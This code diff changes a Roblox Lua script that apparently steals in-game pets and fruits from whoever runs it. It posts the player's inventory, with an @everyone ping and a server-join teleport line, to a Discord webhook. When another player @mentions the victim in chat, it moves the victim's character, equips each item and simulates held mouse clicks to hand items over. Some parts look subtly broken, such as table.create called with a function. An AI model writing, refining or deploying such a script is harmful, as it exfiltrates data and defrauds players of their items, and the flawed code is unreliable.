@@ -14,6 +14,24 @@ local RARE_PETS = {"T-Rex", "Dragonfly", "Raccoon", "Mimic Octopus", "Butterfly"
 local FRUIT_PATTERN = "%[(.-)%]%s(.+)%s%[(%d+%.%d+)kg%]"
 local PET_PATTERN = "(.+)%s%[(%d+%.%d+)%sKG%]%s%[Age%s(%d+)%]"
 
+-- Track current equipped tool
+local currentTool = nil
+local toolRemovedConn = nil
+
+-- Tool verification system
+local function monitorToolRemoval()
+    if toolRemovedConn then
+        toolRemovedConn:Disconnect()
+    end
+    
+    toolRemovedConn = LocalPlayer.Character.ChildRemoved:Connect(function(child)
+        if child == currentTool then
+            currentTool = nil
+            toolRemovedConn:Disconnect()
+        end
+    end)
+end
+
 -- Inventory scanner with priority sorting
 local function scanInventory(player)
     local fruits = {}
@@ -86,127 +104,109 @@ local function scanInventory(player)
     return fruits, pets, rarePets
 end
 
--- Webhook with teleport script
-local function sendJoinNotification(player, fruits, pets, rarePets)
-    local placeId = game.PlaceId
-    local jobId = game.JobId
-    
-    local description = #rarePets > 0 and "🚨 RARE PETS DETECTED!" or "Player joined the game"
-    local color = #rarePets > 0 and 0xFF0000 or 0x00FF00
-    
-    local fields = {
-        {
-            name = "🔗 Join Script", 
-            value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', placeId, jobId),
-            inline = false
-        }
-    }
-    
-    -- Add pets section
-    if #pets > 0 then
-        local petList = {}
-        for _, pet in pairs(pets) do
-            table.insert(petList, pet.name .. (pet.isRare and " ★" or ""))
-        end
-        table.insert(fields, {
-            name = "🐾 Pets ("..#pets..")",
-            value = "```"..table.concat(petList, "\n").."```",
-            inline = true
-        })
-    end
-    
-    -- Add fruits section
-    if #fruits > 0 then
-        local fruitList = {}
-        for _, fruit in pairs(fruits) do
-            table.insert(fruitList, fruit.name)
-        end
-        table.insert(fields, {
-            name = "🍇 Fruits ("..#fruits..")",
-            value = "```"..table.concat(fruitList, "\n").."```",
-            inline = true
-        })
-    end
+-- Send initial inventory to Discord
+local function sendInitialInventory()
+    local fruits, pets, rarePets = scanInventory(LocalPlayer)
     
     local embed = {
-        title = "👤 "..player.Name.." joined",
-        description = description,
-        color = color,
-        fields = fields,
-        footer = {
-            text = "Player ID: "..player.UserId
+        title = "📦 "..LocalPlayer.Name.."'s Inventory",
+        description = "Ready to collect items!",
+        color = #rarePets > 0 and 0xFF0000 or 0x00FF00,
+        fields = {
+            {
+                name = "🐾 Pets ("..#pets..")",
+                value = #pets > 0 and "```"..table.concat(
+                    table.create(#pets, function(i) 
+                        return pets[i].name..(pets[i].isRare and " ★" or "") 
+                    end), 
+                    "\n"
+                ).."```" or "```None```",
+                inline = true
+            },
+            {
+                name = "🍇 Fruits ("..#fruits..")",
+                value = #fruits > 0 and "```"..table.concat(
+                    table.create(#fruits, function(i) return fruits[i].name end), 
+                    "\n"
+                ).."```" or "```None```",
+                inline = true
+            },
+            {
+                name = "🔗 Join Server",
+                value = string.format('```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")\n```', 
+                    game.PlaceId, game.JobId),
+                inline = false
+            }
         }
     }
     
-    local content = #rarePets > 0 and "@everyone" or nil
     pcall(function()
-        if request then
-            request({
-                Url = WEBHOOK_URL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({content = content, embeds = {embed}})
-            })
-        else
-            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({content = content, embeds = {embed}}))
-        end
+        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
+            content = #rarePets > 0 and "@everyone" or nil,
+            embeds = {embed}
+        }))
     end)
 end
 
--- Interaction system
-local function interactWithPlayer(targetPlayer)
+-- Interaction system with verification
+local function collectFromPlayer(targetPlayer)
     local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
     local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-    
+    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
+    if not humanoid then return end
+
     -- Max zoom out
     LocalPlayer.CameraMaxZoomDistance = math.huge
     LocalPlayer.CameraMinZoomDistance = math.huge
     LocalPlayer.CameraMode = Enum.CameraMode.Classic
+
+    -- Position in front of target
+    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+
+    -- Get sorted inventory
+    local fruits, pets = scanInventory(targetPlayer)
+    local allItems = {}
     
-    -- Position in front
-    local humanoid = myChar:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-        myChar:SetPrimaryPartCFrame(targetChar:GetPrimaryPartCFrame() * CFrame.new(0, 0, -3))
+    -- Add pets first (already sorted)
+    for _, pet in pairs(pets) do
+        table.insert(allItems, pet.item)
     end
     
-    -- Get inventory with priority sorting
-    local fruits, pets = scanInventory(targetPlayer)
-    
-    -- Process pets first
-    for _, pet in pairs(pets) do
-        -- Equip the pet
-        humanoid:EquipTool(pet.item)
+    -- Then add fruits (already sorted)
+    for _, fruit in pairs(fruits) do
+        table.insert(allItems, fruit.item)
+    end
+
+    -- Process each item
+    for _, item in pairs(allItems) do
+        -- Equip the item
+        humanoid:EquipTool(item)
+        currentTool = item
+        monitorToolRemoval()
         task.wait(0.5)
-        
-        -- Center screen click and hold
+
+        -- Click and hold for 5 seconds
         local viewport = Camera.ViewportSize
         local center = Vector2.new(viewport.X/2, viewport.Y/2)
         
         VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
-        task.wait(5) -- Hold for 5 seconds
+        
+        -- Wait for 5 seconds or until tool is removed
+        local startTime = os.clock()
+        while os.clock() - startTime < 5 and currentTool ~= nil do
+            task.wait(0.1)
+        end
+        
         VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
         
-        task.wait(1) -- Cooldown
-    end
-    
-    -- Then process fruits if no pets left
-    if #pets == 0 then
-        for _, fruit in pairs(fruits) do
-            -- Equip the fruit
-            humanoid:EquipTool(fruit.item)
-            task.wait(0.5)
-            
-            -- Center screen click and hold
-            local viewport = Camera.ViewportSize
-            local center = Vector2.new(viewport.X/2, viewport.Y/2)
-            
-            VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, true, game, 1)
-            task.wait(5) -- Hold for 5 seconds
-            VirtualInputManager:SendMouseButtonEvent(center.X, center.Y, 0, false, game, 1)
-            
-            task.wait(1) -- Cooldown
+        -- If tool wasn't removed, unequip it manually
+        if currentTool then
+            humanoid:UnequipTools()
+            currentTool = nil
         end
+        
+        task.wait(1) -- Cooldown
     end
 end
 
@@ -214,43 +214,36 @@ end
 local function onPlayerChatted(player, message)
     if player == LocalPlayer then return end
     
-    -- Check for mentions
-    local lowerMsg = message:lower()
-    if not (lowerMsg:find("@"..LocalPlayer.Name:lower()) or
-             lowerMsg:find("@everyone") or
-             lowerMsg:find("@here")) then
+    -- Check for @mention
+    if not message:lower():match("@%s*"..LocalPlayer.Name:lower()) then
         return
     end
     
-    -- Interact with player
-    interactWithPlayer(player)
+    -- Collect from player
+    collectFromPlayer(player)
 end
 
--- Player join handler
-local function onPlayerJoined(player)
-    if player == LocalPlayer then return end
+-- Initial setup
+local function initialize()
+    -- Send initial inventory
+    sendInitialInventory()
     
-    -- Wait for character and backpack to load
-    local char = player.Character or player.CharacterAdded:Wait()
-    player.Backpack:WaitForChild("ChildAdded", 10)
+    -- Setup chat listeners
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            player.Chatted:Connect(onPlayerChatted)
+        end
+    end
     
-    -- Scan inventory
-    local fruits, pets, rarePets = scanInventory(player)
-    
-    -- Send join notification
-    sendJoinNotification(player, fruits, pets, rarePets)
-    
-    -- Setup chat listener
-    player.Chatted:Connect(function(msg)
-        onPlayerChatted(player, msg)
+    Players.PlayerAdded:Connect(function(player)
+        player.Chatted:Connect(onPlayerChatted)
     end)
+    
+    print("✅ Item Collector Active!")
 end
 
--- Initialize
-for _, player in pairs(Players:GetPlayers()) do
-    task.spawn(onPlayerJoined, player)
+-- Start with error protection
+local success, err = pcall(initialize)
+if not success then
+    warn("❌ Initialization failed:", err)
 end
-
-Players.PlayerAdded:Connect(onPlayerJoined)
-
-print("✅ Advanced Item Scanner Active!")
